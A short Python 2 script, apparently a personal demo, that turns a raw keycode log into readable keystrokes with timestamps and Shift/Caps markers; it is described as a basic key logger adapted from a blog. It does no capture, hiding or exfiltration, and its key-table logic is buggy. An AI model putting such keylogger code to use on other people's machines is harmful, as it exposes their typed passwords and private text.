#  Basic key logger adated as per the  below blog ( needs lot  of improvements but good for demostration purposes)
#  http://thesnoopybub.com/basic-keylogger-in-ubuntu/
import datetime
 
# read file of  keymapping
fin = open("/home/sanjeev/scrapy_project/key_logger/key_map.txt", "r")
lineList = fin.readlines()
fin.close()

# change this to use dictionary 
args = ['nul']*88
 
for line in lineList:
        if line[0] == "k":
         print int(line[8:10])
         print line[12:len(line)-1]
         args.insert(int(line[8:10]),line[12:len(line)-1])

fin = open("/home/sanjeev/scrapy_project/key_logger/logger.txt", "r")
lineList = fin.readlines()
fin.close()

f = open("/home/sanjeev/scrapy_project/key_logger/output.log", "a") 
index = 0
for line in lineList:
        #print line
        if line[0:5] == "keyco":
            if index == 0:
                 f.write("\n \n"+datetime.datetime.now().strftime("%I:%M%p on %B %d, %Y")+" \n ========================== \n")
            #Datetime to be saved only when some keycode is read
        ########################### actual keystrokes get recorded here ######################
        index = line[9:11]
        #isinstance( line[9:11], int )
        if index.isdigit():
           index = int(index)
           if (index==42 or index==54) and line[12:len(line)-1]=="press":
            #shift has been pressed
             f.write("<Shift pressed>")
           elif index==58 and line[12:len(line)-1]=="press":
            #caps has been pressed            
            f.write("<Caps pressed>")
           elif index==28 and line[12:len(line)-1]=="release":
            f.write("\n")
           elif index==57 and line[12:len(line)-1]=="release":
            f.write("\t")
           elif (index==42 or index==54) and line[12:len(line)-1]=="release":
            #shift has been released
             f.write("<Shift released>")
           elif index==58 and line[12:len(line)-1]=="release":
            #caps has been released            
              f.write("<Caps released>")
           elif line[12:len(line)-1]=="release":
            f.write(args[index])
f.close()
#file writing is done
